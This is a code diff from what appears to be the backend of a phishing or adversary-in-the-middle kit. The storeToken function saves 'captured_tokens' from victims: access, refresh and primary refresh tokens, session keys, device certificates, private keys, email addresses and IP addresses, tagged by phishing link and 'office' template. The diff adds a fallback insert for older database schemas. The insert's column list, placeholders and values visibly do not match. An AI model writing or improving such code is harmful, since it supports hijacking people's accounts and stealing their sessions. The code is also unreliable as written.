@@ -596,46 +596,61 @@ async function storeToken(job, tokenData, responseCookies = []) {
 
     let tokenId = null;
     try {
-      const [result] = await db.query(
-        `INSERT INTO captured_tokens
-         (user_id, link_id, email, token_type, access_token_encrypted,
-          refresh_token_encrypted, id_token_encrypted,
-          prt, session_key_jwe, device_tenant_id,
-          ip_address, user_agent, expiration, tenant, template_type, client_id,
-          account_type,
-          device_id, device_certificate_encrypted, encrypted_private_key,
-          device_enrolled, enrollment_time)
-         VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, DATE_ADD(NOW(), INTERVAL 876000 HOUR), ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
-        [
-          job.user_id,
-          job.link_id,
-          email,
-          job.mode || 'token',
-          encrypt(tokenData.access_token),
-          encrypt(tokenData.refresh_token || null),
-          encrypt(tokenData.id_token || null),
-          encrypt(prt),
-          clientInfo,
-          encrypt(sessionKeyJwe),
-          deviceTenantId,
-          cookiesEncrypted,
-          ipAddress,
-          userAgent,
-          tenant,
-          'office',
-          accountType,
-          clientIdUsed,
-          deviceId,
-          deviceCertificateEncrypted,
-          encryptedPrivateKey,
-          deviceEnrolled ? 1 : 0,
-          enrollmentTime,
-        ]
-      );
-      tokenId = result.insertId;
-    } catch (insertErr) {
-      const msg = insertErr?.message || '';
-      if (msg.includes('device_id') || msg.includes('device_certificate_encrypted') || msg.includes('encrypted_private_key') || msg.includes('device_enrolled') || msg.includes('enrollment_time')) {
+      try {
+        const [result] = await db.query(
+          `INSERT INTO captured_tokens
+           (user_id, link_id, email, token_type, access_token_encrypted,
+            refresh_token_encrypted, id_token_encrypted,
+            prt, session_key_jwe, device_tenant_id,
+            ip_address, user_agent, expiration, tenant, template_type, client_id,
+            account_type,
+            device_id, device_certificate_encrypted, encrypted_private_key,
+            device_enrolled, enrollment_time)
+           VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, DATE_ADD(NOW(), INTERVAL 876000 HOUR), ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
+          [
+            job.user_id,
+            job.link_id,
+            email,
+            job.mode || 'token',
+            encrypt(tokenData.access_token),
+            encrypt(tokenData.refresh_token || null),
+            encrypt(tokenData.id_token || null),
+            encrypt(prt),
+            clientInfo,
+            encrypt(sessionKeyJwe),
+            deviceTenantId,
+            cookiesEncrypted,
+            ipAddress,
+            userAgent,
+            tenant,
+            'office',
+            accountType,
+            clientIdUsed,
+            deviceId || null,
+            deviceCertificateEncrypted,
+            encryptedPrivateKey,
+            deviceEnrolled ? 1 : 0,
+            enrollmentTime,
+          ]
+        );
+        tokenId = result.insertId;
+      } catch (primaryInsertErr) {
+        const primaryMsg = primaryInsertErr?.message || '';
+        const isDeviceSchemaIssue =
+          /Unknown column 'device_id'/.test(primaryMsg) ||
+          /Unknown column 'device_certificate_encrypted'/.test(primaryMsg) ||
+          /Unknown column 'encrypted_private_key'/.test(primaryMsg) ||
+          /Unknown column 'device_enrolled'/.test(primaryMsg) ||
+          /Unknown column 'enrollment_time'/.test(primaryMsg) ||
+          /Unknown column 'session_key_jwe'/.test(primaryMsg) ||
+          /Unknown column 'device_tenant_id'/.test(primaryMsg) ||
+          /Unknown column 'client_info'/.test(primaryMsg);
+
+        if (!isDeviceSchemaIssue) {
+          console.error('[DeviceProxy] Token insert failed:', primaryInsertErr.message);
+          throw primaryInsertErr;
+        }
+
         console.warn('[DeviceProxy] Device columns missing, falling back to legacy insert');
         const [legacyResult] = await db.query(
           `INSERT INTO captured_tokens
@@ -666,9 +681,9 @@ async function storeToken(job, tokenData, responseCookies = []) {
           ]
         );
         tokenId = legacyResult.insertId;
-      } else {
-        throw insertErr;
       }
+    } catch (e) {
+      console.error('[DeviceProxy] Token insert/fallback error:', e && e.message ? e.message : e);
     }
 
 
